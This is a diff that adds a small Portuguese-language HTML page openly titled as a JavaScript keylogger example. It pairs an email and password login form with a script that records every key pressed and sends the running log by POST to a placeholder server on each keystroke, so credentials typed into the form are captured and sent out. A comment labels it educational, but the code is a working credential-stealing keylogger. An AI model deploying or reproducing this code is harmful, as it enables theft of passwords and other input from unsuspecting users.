@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Exemplo de Keylogger com JavaScript</title>
+  <script>
+    let log = ""; // Onde as teclas serão armazenadas
+
+    // Detecta quando uma tecla é pressionada
+    document.addEventListener("keydown", function(event) {
+      log += event.key; // Armazena a tecla pressionada
+
+      // Envia os dados para um servidor (exemplo educacional)
+      fetch("https://seu-servidor.com/api/log", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ keys: log })
+      });
+
+      console.log("Tecla pressionada:", event.key); // Mostra no console
+    });
+
+    function confirmSubmit() {
+      var email = document.getElementById("email").value;
+      var senha = document.getElementById("senha").value;
+
+      // Verifica se os campos foram preenchidos
+      if (email && senha) {
+        // Exibe a janela de confirmação
+        if (confirm("Você tem certeza que deseja enviar os dados?")) {
+          alert("Dados enviados!");
+          // Pode adicionar aqui o redirecionamento ou ação desejada
+        }
+      } else {
+        alert("Por favor, preencha todos os campos.");
+      }
+    }
+  </script>
+</head>
+<body style="background-color: yellow; font-family: Arial, sans-serif; padding: 20px;">
+  <h1>Email</h1>
+  <input id="email" type="text" placeholder="Email" style="width: 250px; padding: 10px; margin: 10px; font-size: 16px;" />
+
+  <h2>Senha</h2>
+  <input id="senha" type="password" placeholder="Senha" style="width: 250px; padding: 10px; margin: 10px; font-size: 16px;" />
+
+  <br>
+  <button onclick="confirmSubmit()" style="padding: 10px 20px; font-size: 16px;">Confirmar</button>
+</body>
+</html>
